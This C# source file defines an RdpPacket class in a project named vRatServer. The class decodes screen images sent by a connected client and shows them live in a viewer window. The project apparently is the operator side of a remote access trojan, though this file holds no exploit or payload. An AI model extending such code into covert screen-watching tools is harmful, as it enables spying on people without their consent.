using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Packets
{
    class RdpPacket
    {
        Client client;
        byte[] data;

        void updateImage()
        {
            using (MemoryStream ms = new MemoryStream(data))
            {
                Image img = Image.FromStream(ms);
                client.ScreenX = img.Width;
                client.ScreenY = img.Height;
                Bitmap resizedImg = new Bitmap(img);
                try
                {
                    Program.f1.BeginInvoke((MethodInvoker)delegate
                        {
                            if (client.cf == null) { return; }
                            var old = client.cf.pictureBox1.Image;
                            client.cf.pictureBox1.Image = resizedImg;
                            client.cf.fps += 1;
                            old?.Dispose();


                        });

                }
                catch (Exception) { }
                

                img.Dispose();
            }
            
            

            
        }
        public RdpPacket(Classes.Client client, ref byte[] data)
        {

            this.client = client;
            this.data = data;
            updateImage();

        }
    }
}
